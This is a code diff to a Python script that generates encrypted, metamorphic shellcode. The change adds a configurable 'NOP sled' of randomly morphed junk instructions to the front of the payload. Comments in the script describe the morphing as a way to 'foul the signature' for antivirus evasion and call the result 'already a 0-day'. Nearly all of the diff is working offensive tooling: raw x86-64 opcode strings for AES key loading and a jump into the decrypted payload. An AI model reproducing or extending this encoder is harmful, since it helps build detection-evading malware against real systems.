@@ -9,7 +9,7 @@ from random import shuffle
 from sys import argv
 from os import system
 
-def morphSig():
+def morphSig(length=False):
 # metamorphic engine
 	registers=[]
 	extended='\x45'
@@ -28,7 +28,8 @@ def morphSig():
 		instructions.append(packed+extended+operation)
 # all 16 arithmetic instructions for XMMs
 #	length=(int(hex2str(Random.new().ad(1))[2],16)%8
-	length=randint(3,10)
+	if not length:
+		length=randint(3,10)
 # random length from 3 to 10, so from 2^12^3 (70 billion) to 2^12^10 (almost 2^128, so a lot of) possibilities
 	signature=''
 	for cycle in range(length):
@@ -353,6 +354,16 @@ if address:
 
 # let's foul the signature
 signatureStart=morphSig()
+# and add a NOP sled (or not)
+print ''
+sled=raw_input('SPECIFY THE NOP SLED\'S LENGTH (blank for none, maximum 10 000) : ')
+if sled:
+	sled=int(sled)
+print ''
+if sled <= 10000:
+	NOPsled=morphSig(sled)
+else:
+	NOPsled=''
 signatureEnd=morphSig()
 oneHalfKey='\x49\xbe'+key[:len(key)/2]+'\x66\x49\x0f\x6e'+movq14[0]
 twoHalfKey='\x49\xbf'+key[len(key)/2:][len(key)/4:]+key[len(key)/2:][:len(key)/4]+'\x66\x49\x0f\x6e'+movq15[3]
@@ -362,7 +373,7 @@ expandKey='\x66\x0f\x3a\xdf'+xmm[1][0]+'\x01\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc
 decryption=prepare(ciphertext,address)
 # futher obfuscation of values is possible, but since it's already a 0-day, there's no need, for now
 exe='\xff\xe6'
-shellcode=signatureStart+oneHalfKey+twoHalfKey+insertKey+expandKey+decryption+exe+signatureEnd
+shellcode=NOPsled+signatureStart+oneHalfKey+twoHalfKey+insertKey+expandKey+decryption+exe+signatureEnd
 print ''
 print "MORPHED CODE (decipher with encrypted code): "+hex2str(shellcode)
 print ''
